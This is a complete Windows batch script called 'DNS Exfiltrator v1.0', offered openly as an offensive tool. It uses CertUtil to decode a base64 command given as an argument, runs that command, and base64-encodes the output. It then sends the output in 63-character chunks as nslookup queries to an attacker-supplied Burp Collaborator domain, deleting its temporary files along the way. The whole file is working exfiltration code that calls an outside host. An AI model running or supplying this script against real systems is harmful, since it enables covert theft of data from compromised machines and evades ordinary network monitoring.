:: Copyright (c) 2021 Ivan Šincek

@echo off
setlocal EnableDelayedExpansion
	echo #######################################################################
	echo #                                                                     #
	echo #                           DNS Exfiltrator v1.0                      #
	echo #                                      by Ivan Sincek                 #
	echo #                                                                     #
	echo # Exfiltrate data via DNS query.                                      #
	echo # GitHub repository at github.com/ivan-sincek/dns-exfiltrator.        #
	echo # Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.  #
	echo #                                                                     #
	echo #######################################################################
	set enc=dns_exfil_enc.txt
	set dec=dns_exfil_dec.txt
	set error=false
	call :validate %1
	call :validate %2
	if "!error!" EQU "true" (
		echo Usage: dns_exfiltrator.bat ^<base64-enc-command^> ^<burp-collaborator^>
	) else (
		echo %1 > "%enc%"
		CertUtil -f -decode "%enc%" "%dec%" 1>nul 2>nul
		del /f /q "%enc%" 1>nul 2>nul
		if exist "%dec%" (
			for /f "tokens=*" %%i in (%dec%) do (
				set cmd=%%i
			)
			del /f /q "%dec%" 1>nul 2>nul
			for /f "tokens=*" %%i in ('!cmd!') do (
				echo %%i >> "%dec%"
			)
			CertUtil -f -encode "%dec%" "%enc%" 1>nul 2>nul
			del /f /q "%dec%" 1>nul 2>nul
			if exist "%enc%" (
				for /f "tokens=*" %%i in (%enc%) do (
					set payload=!payload!%%i
				)
				del /f /q "%enc%" 1>nul 2>nul
				set payload=!payload:~27,-25!
				:: replace "+" with "plus"
				set payload=!payload:+=plus!
				:: replace "/" with "slash"
				set payload=!payload:/=slash!
				:: remove padding "="
				for /f "tokens=1 delims=^=" %%i in ("!payload!") do (
					set payload=%%i
				)
				call :exfiltrate !payload! %2
			) else (
				echo Cannot encode the output
			)
		) else (
			echo Cannot decode the encoded command
		)
	)
endlocal
exit /b

:validate
	if "%1" EQU "" (
		set error=true
	)
	exit /b

:exfiltrate
	set /a count=0
	:while
		set chunk=%1
		set chunk=!chunk:~%count%,63!
		set /a count=%count%+63
		if "!chunk!" NEQ "" (
			nslookup -retry=5 -timeout=5 -type=a !chunk!.%2
			:: timeout to prevent race condition
			timeout /t 2 /nobreak 1>nul 2>nul
			:: using "goto" within parentheses will break their context
			goto :while
		)
	exit /b
